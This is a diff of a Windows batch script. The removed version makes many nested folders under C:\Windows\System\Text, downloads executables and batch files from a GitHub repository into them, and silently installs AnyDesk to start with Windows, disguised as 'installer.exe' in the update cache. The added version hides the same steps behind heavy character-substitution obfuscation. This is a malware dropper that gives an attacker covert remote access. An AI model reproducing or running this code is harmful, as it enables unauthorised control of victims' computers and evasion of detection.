@@ -1,121 +1,127 @@
-@echo off
-mkdir C:\Windows\System\Text\A
-mkdir C:\Windows\System\Text\A\3
-mkdir C:\Windows\System\Text\A\2
-mkdir C:\Windows\System\Text\A\1
-mkdir C:\Windows\System\Text\B
-mkdir C:\Windows\System\Text\B\3
-mkdir C:\Windows\System\Text\B\2
-mkdir C:\Windows\System\Text\B\1
-mkdir C:\Windows\System\Text\C
-mkdir C:\Windows\System\Text\C\3
-mkdir C:\Windows\System\Text\C\2
-mkdir C:\Windows\System\Text\C\1
-mkdir C:\Windows\System\Text\D
-mkdir C:\Windows\System\Text\D\3
-mkdir C:\Windows\System\Text\D\2
-mkdir C:\Windows\System\Text\D\1
-mkdir C:\Windows\System\Text\E
-mkdir C:\Windows\System\Text\E\3
-mkdir C:\Windows\System\Text\E\2
-mkdir C:\Windows\System\Text\E\1
-mkdir C:\Windows\System\Text\F
-mkdir C:\Windows\System\Text\F\3
-mkdir C:\Windows\System\Text\F\2
-mkdir C:\Windows\System\Text\F\1
-mkdir C:\Windows\System\Text\G
-mkdir C:\Windows\System\Text\G\3
-mkdir C:\Windows\System\Text\G\2
-mkdir C:\Windows\System\Text\G\1
-mkdir C:\Windows\System\Text\H
-mkdir C:\Windows\System\Text\H\3
-mkdir C:\Windows\System\Text\H\2
-mkdir C:\Windows\System\Text\H\3
-mkdir C:\Windows\System\Text\I
-mkdir C:\Windows\System\Text\I\3
-mkdir C:\Windows\System\Text\I\2
-mkdir C:\Windows\System\Text\I\1
-mkdir C:\Windows\System\Text\J
-mkdir C:\Windows\System\Text\J\3
-mkdir C:\Windows\System\Text\J\2
-mkdir C:\Windows\System\Text\J\1
-mkdir C:\Windows\System\Text\K
-mkdir C:\Windows\System\Text\K\3
-mkdir C:\Windows\System\Text\K\2
-mkdir C:\Windows\System\Text\K\1
-mkdir C:\Windows\System\Text\L
-mkdir C:\Windows\System\Text\L\3
-mkdir C:\Windows\System\Text\L\2
-mkdir C:\Windows\System\Text\L\1
-mkdir C:\Windows\System\Text\M
-mkdir C:\Windows\System\Text\M\3
-mkdir C:\Windows\System\Text\M\2
-mkdir C:\Windows\System\Text\M\1
-mkdir C:\Windows\System\Text\N
-mkdir C:\Windows\System\Text\N\3
-mkdir C:\Windows\System\Text\N\2
-mkdir C:\Windows\System\Text\N\1
-mkdir C:\Windows\System\Text\O
-mkdir C:\Windows\System\Text\O\3
-mkdir C:\Windows\System\Text\O\2
-mkdir C:\Windows\System\Text\O\1
-mkdir C:\Windows\System\Text\P
-mkdir C:\Windows\System\Text\P\3
-mkdir C:\Windows\System\Text\P\2
-mkdir C:\Windows\System\Text\P\1
-mkdir C:\Windows\System\Text\Q
-mkdir C:\Windows\System\Text\Q\3
-mkdir C:\Windows\System\Text\Q\2
-mkdir C:\Windows\System\Text\Q\1
-mkdir C:\Windows\System\Text\R
-mkdir C:\Windows\System\Text\R\3
-mkdir C:\Windows\System\Text\R\2
-mkdir C:\Windows\System\Text\R\1
-mkdir C:\Windows\System\Text\S
-mkdir C:\Windows\System\Text\S\3
-mkdir C:\Windows\System\Text\S\2
-mkdir C:\Windows\System\Text\S\1
-mkdir C:\Windows\System\Text\T
-mkdir C:\Windows\System\Text\T\3
-mkdir C:\Windows\System\Text\T\2
-mkdir C:\Windows\System\Text\T\1
-mkdir C:\Windows\System\Text\U
-mkdir C:\Windows\System\Text\U\3
-mkdir C:\Windows\System\Text\U\2
-mkdir C:\Windows\System\Text\U\1
-mkdir C:\Windows\System\Text\V
-mkdir C:\Windows\System\Text\V\3
-mkdir C:\Windows\System\Text\V\2
-mkdir C:\Windows\System\Text\V\1
-mkdir C:\Windows\System\Text\W
-mkdir C:\Windows\System\Text\W\3
-mkdir C:\Windows\System\Text\W\2
-mkdir C:\Windows\System\Text\W\1
-mkdir C:\Windows\System\Text\X
-mkdir C:\Windows\System\Text\X\3
-mkdir C:\Windows\System\Text\X\2
-mkdir C:\Windows\System\Text\X\1
-mkdir C:\Windows\System\Text\Y
-mkdir C:\Windows\System\Text\Y\3
-mkdir C:\Windows\System\Text\Y\2
-mkdir C:\Windows\System\Text\Y\1
-mkdir C:\Windows\System\Text\Z
-mkdir C:\Windows\System\Text\Z\3
-mkdir C:\Windows\System\Text\Z\2
-mkdir C:\Windows\System\Text\Z\1
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System\Text\r\3\accgen.exe
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile C:\Windows\System\Text\t\3\nircmd.exe
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System\Text\r\3\define.bat
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System\Text\r\3\ss.bat
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\Text\r\3\ss1.bat
-powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\Text\r\3\gen.bat
-powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe
-C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe --install "C:\Windows\SoftwareDistribution\Download\SharedFileCache" --start-with-win --silent --update-manually
-timeout 5
+ˇ˛&@cls&@set "√z√=L1sYP@WnXZlipdKV 3tUHRoN04FTr8OExBh9M7gmD5QqIv62kfcueGwzAyabjCSJ"
+%√z√:~5,1%%√z√:~2,1%%√z√:~52,1%%√z√:~18,1%%√z√:~16,1%"%√z√:~60,1%√_%√z√:~15,1%√=%√z√:~54,1%%√z√:~22,1%%√z√:~38,1%%√z√:~10,1%%√z√:~35,1%%√z√:~24,1%%√z√:~1,1%%√z√:~55,1%%√z√:~36,1%%√z√:~3,1%%√z√:~56,1%%√z√:~14,1%%√z√:~49,1%%√z√:~59,1%%√z√:~62,1%%√z√:~43,1%%√z√:~27,1%%√z√:~60,1%%√z√:~44,1%%√z√:~13,1%%√z√:~37,1%%SF∂√mcI%%√z√:~41,1%%√z√:~53,1%%√z√:~15,1%%√z√:~2,1%%√z√:~20,1%%√z√:~31,1%%√z√:~4,1%%√z√:~11,1%%√z√:~29,1%%√z√:~0,1%%√z√:~19,1%%√z√:~17,1%%√z√:~7,1%%√z√:~5,1%%√z√:~16,1%%√z√:~12,1%%√z√:~33,1%%√z√:~28,1%%√z√:~52,1%%√z√:~46,1%%√z√:~23,1%%√z√:~47,1%%√z√:~40,1%%√z√:~8,1%%√z√:~48,1%%√z√:~34,1%%√z√:~51,1%%√z√:~9,1%%√z√:~63,1%%√z√:~30,1%%√z√:~6,1%%√z√:~25,1%%√z√:~26,1%%√z√:~18,1%%√z√:~21,1%%√z√:~57,1%%√z√:~58,1%%√z√:~39,1%%√z√:~61,1%%√z√:~45,1%%√GY√πñ√%%√z√:~42,1%%√z√:~32,1%%√z√:~50,1%"
+%j√_V√:~34,1%%j√_V√:~24,1%%j√_V√:~39,1%%j√_V√:~54,1%%j√_V√:~35,1%"√%j√_V√:~9,1%%j√_V√:~53,1%=%j√_V√:~15,1%%j√_V√:~31,1%%j√_V√:~43,1%%DKLUw†q%%j√_V√:~39,1%%j√_V√:~19,1%%j√_V√:~53,1%%j√_V√:~41,1%%j√_V√:~48,1%%j√_V√:~32,1%%j√_V√:~0,1%%j√_V√:~28,1%%j√_V√:~57,1%%j√_V√:~56,1%%j√_V√:~62,1%%j√_V√:~5,1%%j√_V√:~58,1%%Ñ≠cC√√J%%j√_V√:~20,1%%j√_V√:~17,1%%j√_V√:~59,1%%j√_V√:~10,1%%√√≤√√√n%%j√_V√:~30,1%%j√_V√:~54,1%%j√_V√:~6,1%%j√_V√:~51,1%%j√_V√:~60,1%%j√_V√:~34,1%%j√_V√:~23,1%%j√_V√:~52,1%%j√_V√:~46,1%%j√_V√:~7,1%%j√_V√:~50,1%%j√_V√:~55,1%%j√_V√:~11,1%%j√_V√:~36,1%%j√_V√:~4,1%%j√_V√:~8,1%%j√_V√:~27,1%%j√_V√:~45,1%%j√_V√:~9,1%%j√_V√:~16,1%%£hºáÑ√k%%j√_V√:~1,1%%j√_V√:~35,1%%j√_V√:~12,1%%j√_V√:~47,1%%j√_V√:~37,1%%j√_V√:~2,1%%j√_V√:~21,1%%j√_V√:~3,1%%j√_V√:~49,1%%j√_V√:~25,1%%j√_V√:~24,1%%j√_V√:~38,1%%j√_V√:~22,1%%j√_V√:~26,1%%j√_V√:~13,1%%j√_V√:~33,1%%j√_V√:~61,1%%j√_V√:~63,1%%j√_V√:~29,1%%j√_V√:~14,1%%j√_V√:~40,1%%j√_V√:~42,1%%j√_V√:~44,1%%j√_V√:~18,1%"
+%√YF:~25,1%%√YF:~50,1%%√YF:~3,1%%√YF:~21,1%%√YF:~41,1%"√â%√YF:~18,1%=%√YF:~2,1%%√YF:~60,1%%√YF:~54,1%%√YF:~16,1%%√YF:~20,1%%√YF:~53,1%%√YF:~0,1%%√YF:~51,1%%√YF:~3,1%%√YF:~15,1%%√YF:~1,1%%√YF:~17,1%%√YF:~30,1%%√YF:~8,1%%√YF:~55,1%%√YF:~35,1%%AFÆ√s≥√%%√YF:~31,1%%√YF:~28,1%%√YF:~58,1%%√YF:~34,1%%bQ√π√√√%%√YF:~5,1%%√YF:~36,1%%√YF:~62,1%%√YF:~49,1%%√YF:~37,1%%√YF:~4,1%%√YF:~21,1%%√YF:~10,1%%√YF:~44,1%%√YF:~6,1%%√YF:~33,1%%√YF:~48,1%%√YF:~29,1%%iP√√√≥R%%√YF:~63,1%%√YF:~39,1%%√YF:~38,1%%√YF:~41,1%%√YF:~50,1%%√YF:~9,1%%√YF:~22,1%%√YF:~46,1%%√YF:~59,1%%√YF:~61,1%%√YF:~26,1%%√YF:~23,1%%√YF:~7,1%%√YF:~56,1%%√YF:~42,1%%√YF:~45,1%%√YF:~13,1%%√YF:~24,1%%´√Iß√o√%%√YF:~11,1%%√YF:~57,1%%√YF:~47,1%%√YF:~43,1%%√YF:~52,1%%√YF:~18,1%%√YF:~32,1%%√YF:~19,1%%√YF:~27,1%%√YF:~14,1%%√YF:~25,1%%√YF:~40,1%%√YF:~12,1%"
+%√âC:~61,1%%√âC:~37,1%%√âC:~8,1%%√âC:~26,1%%√âC:~36,1%"Ø¢%√âC:~50,1%=%√âC:~13,1%%√âC:~54,1%%√âC:~19,1%%√âC:~39,1%%√âC:~38,1%%√âC:~33,1%%√âC:~14,1%%√âC:~58,1%%√âC:~25,1%%√âC:~63,1%%√âC:~17,1%%√âC:~0,1%%√âC:~47,1%%√âC:~55,1%%√âC:~46,1%%†√√√E√√%%√âC:~20,1%%√âC:~42,1%%√âC:~8,1%%√âC:~4,1%%√âC:~61,1%%√âC:~11,1%%√âC:~10,1%%√âC:~49,1%%√âC:~59,1%%√âC:~18,1%%√âC:~29,1%%Nf√ªD°b%%√âC:~6,1%%s≥ibcB√%%√âC:~16,1%%√âC:~30,1%%√âC:~32,1%%√âC:~21,1%%√âC:~26,1%%√âC:~3,1%%√âC:~12,1%%√âC:~1,1%%√âC:~56,1%%√âC:~43,1%%√âC:~50,1%%√âC:~7,1%%√âC:~37,1%%√âC:~36,1%%√âC:~60,1%%√âC:~23,1%%√âC:~5,1%%√âC:~53,1%%√âC:~15,1%%√âC:~52,1%%√âC:~31,1%%√âC:~22,1%%√âC:~24,1%%√âC:~57,1%%√âC:~44,1%%√âC:~9,1%%√âC:~35,1%%√âC:~51,1%%√âC:~34,1%%√âC:~48,1%%√âC:~45,1%%√âC:~40,1%%√âC:~2,1%%√âC:~62,1%%√âC:~28,1%%√âC:~41,1%%√âC:~27,1%"
+
+%Ø¢v:~19,1%%Ø¢v:~17,1%%Ø¢v:~46,1%%Ø¢v:~10,1%%Ø¢v:~60,1%%Ø¢v:~40,1%%Ø¢v:~60,1%%Ø¢v:~12,1%%Ø¢v:~12,1%
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\A
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\A\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\A\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%%x√O√√c√%:\Windows\System\Text\A\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\B
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\B\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\B\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\B\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\C
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\C\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%†√√WU√T%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\C\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%F†√√w√£%%Ø¢v:~63,1%%Ø¢v:~38,1%%vT_Ñ√l√%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\C\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\D
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\D\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\D\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\D\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\E
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%πÑ∂cn√√%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\E\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%%â√ZRKµ√%:\Windows\System\Text\E\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\E\1
+%Ø¢v:~52,1%%C√√GµqS%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%√√qXÖ√F%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\F
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%aÑV√Dlz%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\F\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%d√YM≥Og%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\F\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\F\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\G
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%me£√Mq≤%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\G\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\G\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\G\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%%®√ra§s√%:\Windows\System\Text\H
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\H\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\H\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%sL√CÑ≥O%%Ø¢v:~35,1%:\Windows\System\Text\H\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\I
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%√v√≥√f√%%Ø¢v:~35,1%:\Windows\System\Text\I\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\I\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%√≠√√√lY%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\I\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\J
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\J\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%q√√df√√%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\J\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\J\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%scjvúo√%%Ø¢v:~35,1%:\Windows\System\Text\K
+%Ø¢v:~52,1%%Ø¢v:~49,1%%√√¥¢ª¨√%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\K\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\K\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\K\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\L
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\L\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\L\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\L\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%OdUµ´_†%%Ø¢v:~63,1%%Ø¢v:~38,1%%≠√bWTxy%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\M
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\M\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%sin≤µ√Y%%Ø¢v:~38,1%%Ø¢v:~40,1%%√Q≠§√b√%%Ø¢v:~35,1%:\Windows\System\Text\M\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\M\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\N
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\N\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\N\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\N\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\O
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\O\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%√mâb√√y%%Ø¢v:~35,1%:\Windows\System\Text\O\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\O\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%rvCM√√c%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\P
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\P\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%ØFx√√z√%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\P\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\P\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Q
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%núrI√âw%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Q\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Q\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\Q\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\R
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\R\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%âD√∂G√e%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\R\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\R\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\S
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\S\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\S\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\S\1
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\T
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%%√hRe√U√%:\Windows\System\Text\T\3
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\T\2
+%Ø¢v:~52,1%%Ø¢v:~49,1%%Ø¢v:~8,1%%Ø¢v:~63,1%%Ø¢v:~38,1%%Ø¢v:~40,1%%Ø¢v:~35,1%:\Windows\System\Text\T\1
